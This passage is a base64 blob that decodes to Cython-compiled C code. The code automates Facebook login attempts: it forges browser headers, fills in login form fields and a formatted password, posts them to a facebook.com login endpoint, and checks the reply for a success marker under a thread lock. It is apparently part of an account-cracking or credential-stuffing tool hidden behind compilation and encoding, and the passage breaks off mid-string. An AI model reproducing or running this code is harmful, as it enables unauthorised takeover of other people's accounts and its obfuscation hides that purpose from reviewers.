fY29udGVudF90eXBlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2FwcGxpY2F0aW9uX3hfd3d3X2Zvcm1fdXJsZW5jb2RlKSA8IDApIF9fUFlYX0VSUigwLCA3MywgX19weXhfTDFfZXJyb3IpCiAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZHByLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzIpIDwgMCkgX19QWVhfRVJSKDAsIDczLCBfX3B5eF9MMV9lcnJvcikKICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcmlnaW4sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfaHR0cHNfd3d3X2ZhY2Vib29rX2NvbSkgPCAwKSBfX1BZWF9FUlIoMCwgNzMsIF9fcHl4X0wxX2Vycm9yKQogICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JlZmVyZXIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfaHR0cHNfd3d3X2ZhY2Vib29rX2NvbV9sb2dpbl9waHApIDwgMCkgX19QWVhfRVJSKDAsIDczLCBfX3B5eF9MMV9lcnJvcikKICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3Vfc2VjX2NoX3ByZWZlcnNfY29sb3Jfc2NoZW1lLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfbGlnaHQpIDwgMCkgX19QWVhfRVJSKDAsIDczLCBfX3B5eF9MMV9lcnJvcikKICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5""eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3Vfc2VjX2NoX3VhLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X0Nocm9taXVtX3ZfMTM3X05vdF9BX0JyYW5kX3ZfMjQpIDwgMCkgX19QWVhfRVJSKDAsIDczLCBfX3B5eF9MMV9lcnJvcikKICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3Vfc2VjX2NoX3VhX2Z1bGxfdmVyc2lvbl9saXN0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X0Nocm9taXVtX3ZfMTM3XzBfNzMzN18wX05vdF9BX0IpIDwgMCkgX19QWVhfRVJSKDAsIDczLCBfX3B5eF9MMV9lcnJvcikKICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3Vfc2VjX2NoX3VhX21vYmlsZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8wKSA8IDApIF9fUFlYX0VSUigwLCA3MywgX19weXhfTDFfZXJyb3IpCiAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X3NlY19jaF91YV9tb2RlbCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMikgPCAwKSBfX1BZWF9FUlIoMCwgNzMsIF9fcHl4X0wxX2Vycm9yKQogICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9zZWNfY2hfdWFfcGxhdGZvcm0sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfTGludXgpIDwgMCkgX19QWVhfRVJSKDAsIDczLCBfX3B5eF9MMV9lcnJvcikKICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3Vfc2VjX2NoX3VhX3BsYXRmb3JtX3ZlcnNpb24sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzIpIDwgMCkgX19QWVhfRVJSKDAsIDczLCBfX3B5eF9MMV9lcnJvcikKICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3Vfc2VjX2ZldGNoX2Rlc3QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kb2N1bWVudCkgPCAwKSBfX1BZWF9FUlIoMCwgNzMsIF9fcHl4X0wxX2Vycm9yKQogICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9zZWNfZmV0Y2hfbW9kZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X25hdmlnYXRlKSA8IDApIF9fUFlYX0VSUigwLCA3MywgX19weXhfTDFfZXJyb3IpCiAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X3NlY19mZXRjaF9zaXRlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X3NhbWVfb3JpZ2luKSA8IDApIF9fUFlYX0VSUigwLCA3MywgX19weXhfTDFfZXJyb3IpCiAgICBpZiAoUHlEaWN0X1Nl""dEl0ZW0oX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X3NlY19mZXRjaF91c2VyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzFfMikgPCAwKSBfX1BZWF9FUlIoMCwgNzMsIF9fcHl4X0wxX2Vycm9yKQogICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV91cGdyYWRlX2luc2VjdXJlX3JlcXVlc3RzLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzEpIDwgMCkgX19QWVhfRVJSKDAsIDczLCBfX3B5eF9MMV9lcnJvcikKICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfdXNlcl9hZ2VudCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9Nb3ppbGxhXzVfMF9YMTFfTGludXhfeDg2XzY0X0FwcCkgPCAwKSBfX1BZWF9FUlIoMCwgNzMsIF9fcHl4X0wxX2Vycm9yKQogICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV92aWV3cG9ydF93aWR0aCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV85ODApIDwgMCkgX19QWVhfRVJSKDAsIDczLCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X1hERUNSRUZfU0VUKF9fcHl4X3ZfSywgKChQeU9iamVjdCopX19weXhfdF8xKSk7CiAgICBfX3B5eF90XzEgPSAwOwoKICAgIAogICAgX19weXhfdF8xID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCA3NSwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTsKICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9sb2dpbl9hdHRlbXB0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzEpIDwgMCkgX19QWVhfRVJSKDAsIDc1LCBfX3B5eF9MMV9lcnJvcikKICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9sd3YsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMTAwKSA8IDApIF9fUFlYX0VSUigwLCA3NSwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9YREVDUkVGX1NFVChfX3B5eF92X0wsICgoUHlPYmplY3QqKV9fcHl4X3RfMSkpOwogICAgX19weXhfdF8xID0gMDsKCiAgICAKICAgIF9fcHl4X3RfNCA9IE5VTEw7CiAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RpbWUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA3NiwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xv""YmFsLT5fX3B5eF9uX3VfdGltZSk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDc2LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICBfX3B5eF90XzUgPSAxOwogICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfNikpKSB7CiAgICAgIF9fcHl4X3RfNCA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfNik7CiAgICAgIGFzc2VydChfX3B5eF90XzQpOwogICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNik7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzQpOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTsKICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzYsIF9fcHl4X19mdW5jdGlvbik7CiAgICAgIF9fcHl4X3RfNSA9IDA7CiAgICB9CiAgICAjZW5kaWYKICAgIHsKICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNCwgTlVMTH07CiAgICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNiwgX19weXhfY2FsbGFyZ3MrX19weXhfdF81LCAoMS1fX3B5eF90XzUpIHwgKF9fcHl4X3RfNSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgNzYsIF9fcHl4X0wxX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTsKICAgIH0KICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5TnVtYmVyX0ludChfX3B5eF90XzEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA3NiwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfVW5pY29kZShfX3B5eF90XzYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCA3NiwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgX19QeXhfWERFQ1JFRl9TRVQoX19weXhfdl9NLCAoKFB5T2JqZWN0KilfX3B5eF90XzEpKTsKICAgIF9fcHl4X3RfMSA9IDA7CgogICAgCiAgICBfX3B5eF90XzEgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoMjMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCA3NywgX19weXhfTDFfZXJyb3Ip""CiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTsKICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9qYXpvZXN0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzI4NjcpIDwgMCkgX19QWVhfRVJSKDAsIDc3LCBfX3B5eF9MMV9lcnJvcikKICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9sc2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9BZEU2UENkbjNSWSkgPCAwKSBfX1BZWF9FUlIoMCwgNzcsIF9fcHl4X0wxX2Vycm9yKQogICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Rpc3BsYXksIF9fcHl4X3ZfQSkgPCAwKSBfX1BZWF9FUlIoMCwgNzcsIF9fcHl4X0wxX2Vycm9yKQogICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2lzcHJpdmF0ZSwgX19weXhfdl9BKSA8IDApIF9fUFlYX0VSUigwLCA3NywgX19weXhfTDFfZXJyb3IpCiAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmV0dXJuX3Nlc3Npb24sIF9fcHl4X3ZfQSkgPCAwKSBfX1BZWF9FUlIoMCwgNzcsIF9fcHl4X0wxX2Vycm9yKQogICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NraXBfYXBpX2xvZ2luLCBfX3B5eF92X0EpIDwgMCkgX19QWVhfRVJSKDAsIDc3LCBfX3B5eF9MMV9lcnJvcikKICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zaWduZWRfbmV4dCwgX19weXhfdl9BKSA8IDApIF9fUFlYX0VSUigwLCA3NywgX19weXhfTDFfZXJyb3IpCiAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdHJ5bnVtLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzEpIDwgMCkgX19QWVhfRVJSKDAsIDc3LCBfX3B5eF9MMV9lcnJvcikKICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90aW1lem9uZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8xODApIDwgMCkgX19QWVhfRVJSKDAsIDc3LCBfX3B5eF9MMV9lcnJvcikKICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9sZ25kaW0sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9leUozSWpvek5qQXNJbWdpT2pnd01Dd2lZWGNpT2pNMikgPCAwKSBfX1BZWF9FUlIoMCwgNzcsIF9fcHl4X0wxX2Vycm9yKQogICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhf""bl91X2xnbnJuZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8xMDIxMjVfMGtjYykgPCAwKSBfX1BZWF9FUlIoMCwgNzcsIF9fcHl4X0wxX2Vycm9yKQogICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2xnbmpzLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzE3NTczNTIwODUpIDwgMCkgX19QWVhfRVJSKDAsIDc3LCBfX3B5eF9MMV9lcnJvcikKICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zaGFSX3ByZWZzX2RhdGEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9leUl6TURBd01DSTZXM3NpZENJNk1UYzFOek0xTWpBNCkgPCAwKSBfX1BZWF9FUlIoMCwgNzcsIF9fcHl4X0wxX2Vycm9yKQogICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2VtYWlsLCBfX3B5eF92X0IpIDwgMCkgX19QWVhfRVJSKDAsIDc3LCBfX3B5eF9MMV9lcnJvcikKICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9wcmVmaWxsX2NvbnRhY3RfcG9pbnQsIF9fcHl4X3ZfQikgPCAwKSBfX1BZWF9FUlIoMCwgNzcsIF9fcHl4X0wxX2Vycm9yKQogICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3ByZWZpbGxfc291cmNlLCBfX3B5eF92X0MpIDwgMCkgX19QWVhfRVJSKDAsIDc3LCBfX3B5eF9MMV9lcnJvcikKICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9wcmVmaWxsX3R5cGUsIF9fcHl4X3ZfRSkgPCAwKSBfX1BZWF9FUlIoMCwgNzcsIF9fcHl4X0wxX2Vycm9yKQogICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2ZpcnN0X3ByZWZpbGxfc291cmNlLCBfX3B5eF92X0MpIDwgMCkgX19QWVhfRVJSKDAsIDc3LCBfX3B5eF9MMV9lcnJvcikKICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9maXJzdF9wcmVmaWxsX3R5cGUsIF9fcHl4X3ZfRSkgPCAwKSBfX1BZWF9FUlIoMCwgNzcsIF9fcHl4X0wxX2Vycm9yKQogICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2hhZF9jcF9wcmVmaWxsZWQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90cnVlKSA8IDApIF9fUFlYX0VSUigwLCA3NywgX19weXhfTDFfZXJyb3IpCiAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaGFkX3Bhc3N3b3JkX3ByZWZpbGxlZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Zh""bHNlKSA8IDApIF9fUFlYX0VSUigwLCA3NywgX19weXhfTDFfZXJyb3IpCiAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYWJfdGVzdF9kYXRhLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEpIDwgMCkgX19QWVhfRVJSKDAsIDc3LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fcHl4X3RfN1swXSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfUFdEX0JST1dTRVJfMDsKICAgIF9fcHl4X3RfN1sxXSA9IF9fcHl4X3ZfTTsKICAgIF9fcHl4X3RfN1syXSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZGpkampzYmRuc25zbnNqc25lanNqanpiOwogICAgX19weXhfdF82ID0gX19QeXhfUHlVbmljb2RlX0pvaW4oX19weXhfdF83LCAzLCAxNSArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3ZfTSkgKyAyNSwgMTI3IHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3ZfTSkpOwogICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgNzcsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZW5jcGFzcywgX19weXhfdF82KSA8IDApIF9fUFlYX0VSUigwLCA3NywgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgIF9fUHl4X1hERUNSRUZfU0VUKF9fcHl4X3ZfTiwgKChQeU9iamVjdCopX19weXhfdF8xKSk7CiAgICBfX3B5eF90XzEgPSAwOwoKICAgIAogICAgewogICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmUKICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ24KICAgICAgX19QeXhfRXhjZXB0aW9uU2F2ZSgmX19weXhfdF84LCAmX19weXhfdF85LCAmX19weXhfdF8xMCk7CiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF84KTsKICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzkpOwogICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTApOwogICAgICAgewoKICAgICAgICAKICAgICAgICBfX3B5eF90XzYgPSBfX3B5eF92X0c7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNik7CgogICAgICAgIAogICAgICAgIF9fcHl4X3RfNSA9IDA7CiAgICAgICAgewogICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzIgKyAoKENZVEhPTl9WRUNUT1JDQUxMKSA/IDUgOiAwKV0gPSB7X19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2h0dHBzX3d3d19mYWNlYm9va19jb21fbG9naW5fZGV2fTsKICAgICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X01ha2VWZWN0b3JjYWxsQnVpbGRlckt3ZHMoNSk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDc5""LCBfX3B5eF9MNV9lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgICAgICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcGFyYW1zLCBfX3B5eF92X0wsIF9fcHl4X3RfNCwgX19weXhfY2FsbGFyZ3MrMiwgMCkgPCAwKSBfX1BZWF9FUlIoMCwgNzksIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY29va2llcywgX19weXhfdl9KLCBfX3B5eF90XzQsIF9fcHl4X2NhbGxhcmdzKzIsIDEpIDwgMCkgX19QWVhfRVJSKDAsIDc5LCBfX3B5eF9MNV9lcnJvcikKICAgICAgICAgIGlmIChfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2hlYWRlcnMsIF9fcHl4X3ZfSywgX19weXhfdF80LCBfX3B5eF9jYWxsYXJncysyLCAyKSA8IDApIF9fUFlYX0VSUigwLCA3OSwgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kYXRhLCBfX3B5eF92X04sIF9fcHl4X3RfNCwgX19weXhfY2FsbGFyZ3MrMiwgMykgPCAwKSBfX1BZWF9FUlIoMCwgNzksIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGltZW91dCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzEwLCBfX3B5eF90XzQsIF9fcHl4X2NhbGxhcmdzKzIsIDQpIDwgMCkgX19QWVhfRVJSKDAsIDc5LCBfX3B5eF9MNV9lcnJvcikKICAgICAgICAgIF9fcHl4X3RfMSA9IF9fUHl4X09iamVjdF9WZWN0b3JjYWxsTWV0aG9kX0NhbGxGcm9tQnVpbGRlcihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcG9zdCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF81LCAoMi1fX3B5eF90XzUpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSwgX19weXhfdF80KTsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgNzksIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgICAgICAgfQogICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGV4dCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDgwLCBfX3B5eF9MNV9lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhf""dF80KTsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICAgICAgICBfX1B5eF9YREVDUkVGX1NFVChfX3B5eF92X08sIF9fcHl4X3RfNCk7CiAgICAgICAgX19weXhfdF80ID0gMDsKCiAgICAgICAgCiAgICAgICAgX19weXhfdF8xMSA9IChfX1B5eF9QeVNlcXVlbmNlX0NvbnRhaW5zVEYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9Gb2N1c0xpc3RlbmVyLCBfX3B5eF92X08sIFB5X0VRKSk7IGlmICh1bmxpa2VseSgoX19weXhfdF8xMSA8IDApKSkgX19QWVhfRVJSKDAsIDgxLCBfX3B5eF9MNV9lcnJvcikKICAgICAgICBpZiAoX19weXhfdF8xMSkgewoKICAgICAgICAgIAogICAgICAgICAgIHsKICAgICAgICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9sb2NrKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgODIsIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICAgICAgICAgICAgX19weXhfdF8xMiA9IF9fUHl4X1B5T2JqZWN0X0xvb2t1cFNwZWNpYWwoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZXhpdCk7IGlmICh1bmxpa2Vse